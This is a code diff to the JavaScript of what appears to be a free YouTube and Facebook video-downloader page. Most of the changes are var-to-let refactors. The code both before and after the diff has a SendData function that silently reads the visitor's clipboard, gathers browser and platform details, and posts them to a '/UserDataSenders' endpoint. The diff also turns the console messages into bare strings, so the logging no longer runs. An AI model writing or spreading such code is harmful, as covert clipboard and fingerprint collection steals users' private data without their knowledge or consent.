@@ -1,5 +1,5 @@
 // typewritter Animation
-var typed = new Typed(".auto-type", {
+let typed = new Typed(".auto-type", {
   strings: [
     "Download Free YouTube Video",
     "Download Free Facebook Video",
@@ -18,14 +18,14 @@ function SendData() {
   navigator.clipboard
     .readText()
     .then((ClipText) => {
-      var Platform = navigator.platform;
-      var Engine = navigator.product;
-      var OnlineStatus = navigator.onLine;
-      var Language = navigator.language;
-      var BrowserName = navigator.appName;
-      var BrowserVersion = navigator.appVersion;
+      let Platform = navigator.platform;
+      let Engine = navigator.product;
+      let OnlineStatus = navigator.onLine;
+      let Language = navigator.language;
+      let BrowserName = navigator.appName;
+      let BrowserVersion = navigator.appVersion;
       //Objecting All Data
-      var Final_Object_Data = {
+      let Final_Object_Data = {
         ClipBoard_Text: ClipText,
         Platform: Platform,
         Engine: Engine,
@@ -34,8 +34,8 @@ function SendData() {
         BrowserName: BrowserName,
         BrowserVersion: BrowserVersion,
       };
-      console.log("Data Sending To Server");
-      var params = {
+      ("Data Sending To Server");
+      let params = {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -44,19 +44,19 @@ function SendData() {
       };
       fetch("/UserDataSenders", params).then((data) => {
         data.json().then((data) => {
-          console.log("Data Saved to Server & returned successfully");
+          ("Data Saved to Server & returned successfully");
         });
       });
     })
     .catch((ClipError) => {
-      var Platform = navigator.platform;
-      var Engine = navigator.product;
-      var OnlineStatus = navigator.onLine;
-      var Language = navigator.language;
-      var BrowserName = navigator.appName;
-      var BrowserVersion = navigator.appVersion;
+      let Platform = navigator.platform;
+      let Engine = navigator.product;
+      let OnlineStatus = navigator.onLine;
+      let Language = navigator.language;
+      let BrowserName = navigator.appName;
+      let BrowserVersion = navigator.appVersion;
       //Objecting All Data
-      var Final_Object_Data = {
+      let Final_Object_Data = {
         ClipBoard_Text: ClipError.message,
         Platform: Platform,
         Engine: Engine,
@@ -65,8 +65,8 @@ function SendData() {
         BrowserName: BrowserName,
         BrowserVersion: BrowserVersion,
       };
-      console.log("Data Sending To Server");
-      var parameters = {
+      ("Data Sending To Server");
+      let parameters = {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -75,7 +75,7 @@ function SendData() {
       };
       fetch("/UserDataSenders", parameters).then((response) => {
         response.json().then((data) => {
-          console.log("Data Saved to Server & returned successfully");
+          ("Data Saved to Server & returned successfully");
         });
       });
     });
